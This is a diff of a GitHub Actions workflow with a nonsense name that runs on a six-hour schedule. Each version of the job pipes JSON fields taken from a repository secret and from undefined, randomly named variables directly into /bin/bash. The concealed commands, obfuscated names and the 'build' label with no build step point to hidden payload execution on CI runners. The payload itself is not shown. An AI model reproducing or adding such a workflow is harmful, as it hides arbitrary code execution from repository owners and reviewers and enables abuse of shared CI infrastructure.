@@ -2,22 +2,17 @@ name: immodestunguarded
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 0/6 * * *'
+    - cron: '33 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: immodestunguarded
         env:
-          xzifx85015: ${{ secrets.xzifx85015 }}
+          y73: ${{ secrets.y73 }}
         run: |
-          echo $xzifx85015 | jq -r .uhjg68 | /bin/bash
-          echo $gyti47 | jq -r .vg9 | /bin/bash
-          echo $oiuh0 | jq -r .fu2886 | /bin/bash
-          echo $fkf90732 | jq -r .ucft69 | /bin/bash
-          echo $smwc124 | jq -r .twun14 | /bin/bash
-          echo $wgdit143 | jq -r .p5886 | /bin/bash
-          echo $fa1967 | jq -r .sw9100 | /bin/bash
+          echo $y73 | jq -r .dvbrz08433 | /bin/bash
+          echo $b20777 | jq -r .box197 | /bin/bash
+          echo $m7549 | jq -r .kxnm219 | /bin/bash
 
